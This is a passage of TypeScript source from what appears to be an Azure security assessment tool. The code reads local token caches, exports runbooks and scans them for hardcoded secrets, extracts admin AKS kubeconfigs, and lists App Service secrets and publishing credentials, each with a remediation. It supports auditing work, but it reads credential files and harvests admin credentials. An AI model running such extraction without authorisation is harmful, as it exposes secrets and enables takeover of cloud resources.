          title: "Primary Refresh Token (PRT) present on device",
          details: "PRT can be extracted for session hijacking — use tools like ROADtoken or RequestAADRefreshToken",
          remediation: "Wipe device registration or revoke sessions",
        })
      } else {
        output.push("[-] No PRT detected on this device")
      }
    }
  } else {
    output.push("\n[*] PRT extraction via dsregcmd only available on Windows — skipping")
  }

  const cacheFiles = [
    `${process.env.HOME || process.env.USERPROFILE}/.azure/azureProfile.json`,
    `${process.env.HOME || process.env.USERPROFILE}/.azure/msal_token_cache.json`,
    `${process.env.HOME || process.env.USERPROFILE}/.azure/msal_token_cache.bin`,
    `${process.env.HOME || process.env.USERPROFILE}/.azure/service_principal_entries.json`,
  ]
  output.push("\n[*] Checking local token caches...")
  for (const p of cacheFiles) {
    try {
      const f = Bun.file(p)
      if (await f.exists()) {
        const size = f.size
        output.push(`[+] Found: ${p} (${size} bytes)`)
        if (p.endsWith(".json") && size < 1_000_000) {
          const content = await f.text()
          const parsed = tryJson(content)
          if (parsed) {
            const keys = Object.keys(parsed)
            output.push(`    Keys: ${keys.slice(0, 10).join(", ")}${keys.length > 10 ? ` (+${keys.length - 10} more)` : ""}`)
          }
        }
        findings.push({
          checkId: "AZ-PRT-003",
          provider: "azure",
          severity: "medium",
          status: "FOUND",
          resource: `file://${p}`,
          title: `Token cache file found: ${p.split("/").pop()}`,
          details: `${size} bytes — may contain refresh tokens or cached credentials`,
          remediation: "Clear token cache: az account clear",
        })
      }
    } catch {}
  }

  return { output: output.join("\n"), findings }
}

export async function runbookCredExtract(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const targetAccount = argVal(args, "--automation-account")
  const targetRg = argVal(args, "--resource-group")
  const targetRunbook = argVal(args, "--runbook")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting runbook source code and scanning for credentials...\n"]

  const credPatterns = [
    { name: "Password", regex: /(?:password|passwd|pwd)\s*[=:]\s*["']([^"']{4,})["']/gi },
    { name: "Connection String", regex: /(?:connectionstring|connstr|connection_string)\s*[=:]\s*["']([^"']{10,})["']/gi },
    { name: "API Key", regex: /(?:apikey|api_key|api-key|x-api-key)\s*[=:]\s*["']([^"']{10,})["']/gi },
    { name: "Secret", regex: /(?:secret|client_secret|clientsecret)\s*[=:]\s*["']([^"']{4,})["']/gi },
    { name: "SAS Token", regex: /(?:sv=\d{4}-\d{2}-\d{2}&[^"'\s]{20,})/gi },
    { name: "Access Key", regex: /(?:AccountKey|accesskey|access_key)\s*[=:]\s*["']?([A-Za-z0-9+/=]{40,})["']?/gi },
  ]

  let accounts: Array<{ name: string; rg: string }> = []
  if (targetAccount && targetRg) {
    accounts = [{ name: targetAccount, rg: targetRg }]
  } else {
    const list = await az(["automation", "account", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
    if (list.exitCode === 0) accounts = tryJson(list.stdout) || []
  }

  if (accounts.length === 0) {
    output.push("[-] No automation accounts found")
    return { output: output.join("\n"), findings }
  }

  for (const acct of accounts) {
    output.push(`\n[*] Account: ${acct.name} (RG: ${acct.rg})`)
    const rbList = await az(
      ["automation", "runbook", "list", "--automation-account-name", acct.name, "--resource-group", acct.rg, "--query", "[].{name:name,type:runbookType,state:state}"],
      sub,
      timeout,
    )
    if (rbList.exitCode !== 0) {
      output.push("  [-] Cannot list runbooks")
      continue
    }
    const runbooks = (tryJson(rbList.stdout) || []) as Array<{ name: string; type: string; state: string }>
    const targets = targetRunbook ? runbooks.filter((r) => r.name === targetRunbook) : runbooks

    for (const rb of targets) {
      output.push(`\n  [*] Runbook: ${rb.name} (${rb.type}, ${rb.state})`)
      const exportCmd = await run(
        "az",
        ["automation", "runbook", "export", "--automation-account-name", acct.name, "--resource-group", acct.rg, "--name", rb.name, "-o", "tsv", ...(sub ? ["--subscription", sub] : [])],
        timeout,
      )

      if (exportCmd.exitCode !== 0 || !exportCmd.stdout.trim()) {
        output.push(`    [-] Cannot export source (exit=${exportCmd.exitCode})`)
        continue
      }

      const source = exportCmd.stdout
      output.push(`    [+] Source extracted: ${source.length} chars`)

      let credsFound = 0
      for (const pat of credPatterns) {
        pat.regex.lastIndex = 0
        let match
        while ((match = pat.regex.exec(source)) !== null) {
          credsFound++
          const lineNum = source.substring(0, match.index).split("\n").length
          const snippet = match[0].substring(0, 80)
          output.push(`    [!] ${pat.name} found at line ${lineNum}: ${snippet}...`)
          findings.push({
            checkId: "AZ-RUNBOOK-001",
            provider: "azure",
            severity: "critical",
            status: "FOUND",
            resource: `runbook://${acct.name}/${rb.name}:${lineNum}`,
            title: `${pat.name} in runbook ${rb.name}`,
            details: `Found at line ${lineNum}: ${snippet.substring(0, 60)}...`,
            remediation: "Move credentials to Key Vault or Automation Account credentials, remove from source",
          })
        }
      }
      if (credsFound === 0) output.push("    [-] No hardcoded credentials detected")
    }
  }

  return { output: output.join("\n"), findings }
}

export async function kubeconfigDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const targetCluster = argVal(args, "--cluster")
  const targetRg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating AKS clusters and extracting kubeconfig...\n"]

  const list = await az(["aks", "list", "--query", "[].{name:name,rg:resourceGroup,rbac:enableRbac,aad:aadProfile,mi:identity.type,network:networkProfile.networkPlugin,fqdn:fqdn,publicAccess:apiServerAccessProfile.enablePrivateCluster}"], sub, timeout)
  if (list.exitCode !== 0) {
    output.push("[-] Cannot list AKS clusters")
    return { output: output.join("\n"), findings }
  }

  const clusters = (tryJson(list.stdout) || []) as Array<Record<string, unknown>>
  output.push(`[+] Found ${clusters.length} AKS cluster(s)\n`)

  for (const c of clusters) {
    const name = c.name as string
    const rg = c.rg as string
    if (targetCluster && name !== targetCluster) continue
    if (targetRg && rg !== targetRg) continue

    output.push(`[*] Cluster: ${name} (RG: ${rg})`)
    output.push(`    RBAC: ${c.rbac ? "enabled" : "DISABLED"}`)
    output.push(`    AAD Integration: ${c.aad ? "enabled" : "not configured"}`)
    output.push(`    Identity: ${c.mi || "N/A"}`)
    output.push(`    Network Plugin: ${c.network || "N/A"}`)
    output.push(`    FQDN: ${c.fqdn || "N/A"}`)
    output.push(`    Private Cluster: ${c.publicAccess === true ? "yes" : "no (public API)"}`)

    if (!c.rbac) {
      findings.push({
        checkId: "AZ-KUBE-001",
        provider: "azure",
        severity: "critical",
        status: "FAIL",
        resource: `aks://${rg}/${name}`,
        title: `AKS cluster ${name} has RBAC disabled`,
        details: "Without RBAC, any authenticated user has full cluster access",
        remediation: "Enable RBAC: az aks update --enable-aad --enable-azure-rbac",
      })
    }

    if (c.publicAccess !== true) {
      findings.push({
        checkId: "AZ-KUBE-002",
        provider: "azure",
        severity: "high",
        status: "FAIL",
        resource: `aks://${rg}/${name}`,
        title: `AKS cluster ${name} has public API endpoint`,
        details: `API server is publicly accessible at ${c.fqdn}`,
        remediation: "Enable private cluster: az aks update --enable-private-cluster",
      })
    }

    const adminCreds = await run("az", ["aks", "get-credentials", "--resource-group", rg, "--name", name, "--admin", "--file", "-", ...(sub ? ["--subscription", sub] : [])], timeout)
    if (adminCreds.exitCode === 0 && adminCreds.stdout.trim()) {
      output.push(`    [+] ADMIN kubeconfig extracted (${adminCreds.stdout.length} bytes)`)
      const kubecfg = adminCreds.stdout
      if (kubecfg.includes("client-certificate-data")) output.push("    [+] Contains client certificate data")
      if (kubecfg.includes("client-key-data")) output.push("    [+] Contains client key data")
      if (kubecfg.includes("token")) output.push("    [+] Contains access token")
      findings.push({
        checkId: "AZ-KUBE-003",
        provider: "azure",
        severity: "critical",
        status: "EXTRACTED",
        resource: `aks://${rg}/${name}/admin-kubeconfig`,
        title: `Admin kubeconfig extracted for AKS cluster ${name}`,
        details: "Admin credentials provide full cluster access — no RBAC restrictions",
        remediation: "Disable local accounts: az aks update --disable-local-accounts",
      })
    } else {
      output.push("    [-] Admin kubeconfig not available (local accounts may be disabled)")
      const userCreds = await run("az", ["aks", "get-credentials", "--resource-group", rg, "--name", name, "--file", "-", ...(sub ? ["--subscription", sub] : [])], timeout)
      if (userCreds.exitCode === 0 && userCreds.stdout.trim()) {
        output.push(`    [+] User kubeconfig extracted (${userCreds.stdout.length} bytes)`)
        findings.push({
          checkId: "AZ-KUBE-004",
          provider: "azure",
          severity: "high",
          status: "EXTRACTED",
          resource: `aks://${rg}/${name}/user-kubeconfig`,
          title: `User kubeconfig extracted for AKS cluster ${name}`,
          details: "User credentials extracted — access level depends on RBAC bindings",
          remediation: "Review cluster RBAC bindings and restrict access",
        })
      } else {
        output.push("    [-] Cannot extract user kubeconfig either")
      }
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}

export async function webappEnvDump(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const targetApp = argVal(args, "--app")
  const targetRg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting App Service environment variables and connection strings...\n"]

  const secretPatterns = [
    /password/i, /secret/i, /key(?!vault)/i, /token/i, /connection.?string/i,
    /api.?key/i, /access.?key/i, /sas/i, /credential/i, /auth/i, /private/i,
  ]

  let apps: Array<{ name: string; rg: string }> = []
  if (targetApp && targetRg) {
    apps = [{ name: targetApp, rg: targetRg }]
  } else {
    const list = await az(["webapp", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
    if (list.exitCode === 0) apps = tryJson(list.stdout) || []
    const funcList = await az(["functionapp", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
    if (funcList.exitCode === 0) apps = [...apps, ...(tryJson(funcList.stdout) || [])]
  }

  if (apps.length === 0) {
    output.push("[-] No App Services or Function Apps found")
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Found ${apps.length} app(s)\n`)

  for (const app of apps) {
    output.push(`[*] App: ${app.name} (RG: ${app.rg})`)

    const settings = await az(
      ["webapp", "config", "appsettings", "list", "--name", app.name, "--resource-group", app.rg],
      sub,
      timeout,
    )
    if (settings.exitCode === 0) {
      const settingsList = (tryJson(settings.stdout) || []) as Array<{ name: string; value: string; slotSetting: boolean }>
      output.push(`    [+] App Settings: ${settingsList.length}`)
      for (const s of settingsList) {
        const isSensitive = secretPatterns.some((p) => p.test(s.name))
        if (isSensitive) {
          const masked = s.value ? `${s.value.substring(0, 6)}...${s.value.substring(s.value.length - 4)}` : "(empty)"
          output.push(`    [!] SENSITIVE: ${s.name} = ${masked}`)
          findings.push({
            checkId: "AZ-WEBAPP-001",
            provider: "azure",
            severity: "high",
            status: "FOUND",
            resource: `webapp://${app.name}/setting/${s.name}`,
            title: `Sensitive app setting: ${s.name} in ${app.name}`,
            details: `Value (masked): ${masked}`,
            remediation: "Move to Key Vault reference: @Microsoft.KeyVault(SecretUri=...)",
          })
        } else {
          output.push(`        ${s.name} = ${(s.value || "").substring(0, 60)}${(s.value || "").length > 60 ? "..." : ""}`)
        }
      }
    }

    const connStrings = await az(
      ["webapp", "config", "connection-string", "list", "--name", app.name, "--resource-group", app.rg],
      sub,
      timeout,
    )
    if (connStrings.exitCode === 0) {
      const connData = tryJson(connStrings.stdout)
      if (connData && typeof connData === "object") {
        const entries = Object.entries(connData) as Array<[string, { type: string; value: string }]>
        output.push(`    [+] Connection Strings: ${entries.length}`)
        for (const [connName, info] of entries) {
          if (info.value) {
            const masked = `${info.value.substring(0, 15)}...`
            output.push(`    [!] ${connName} (${info.type}): ${masked}`)
            findings.push({
              checkId: "AZ-WEBAPP-002",
              provider: "azure",
              severity: "critical",
              status: "FOUND",
              resource: `webapp://${app.name}/connstring/${connName}`,
              title: `Connection string in ${app.name}: ${connName}`,
              details: `Type: ${info.type}, Value (masked): ${masked}`,
              remediation: "Use Key Vault references for connection strings",
            })
          }
        }
      }
    }

    const publishProfile = await az(
      ["webapp", "deployment", "list-publishing-profiles", "--name", app.name, "--resource-group", app.rg],
      sub,
      timeout,
    )
    if (publishProfile.exitCode === 0) {
      const profileList = (tryJson(publishProfile.stdout) || []) as Array<{ publishMethod: string; userName: string; userPWD: string; publishUrl: string }>
      if (profileList.length > 0) {
        output.push(`    [+] Publishing Profiles: ${profileList.length}`)
        for (const p of profileList) {
          output.push(`        ${p.publishMethod}: ${p.userName} @ ${p.publishUrl}`)
          findings.push({
            checkId: "AZ-WEBAPP-003",
            provider: "azure",
            severity: "high",
            status: "FOUND",
            resource: `webapp://${app.name}/publish/${p.publishMethod}`,
            title: `Publishing credentials for ${app.name} (${p.publishMethod})`,
            details: `User: ${p.userName}, URL: ${p.publishUrl}`,
            remediation: "Reset publishing credentials and use deployment slots",
          })
        }
      }
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}
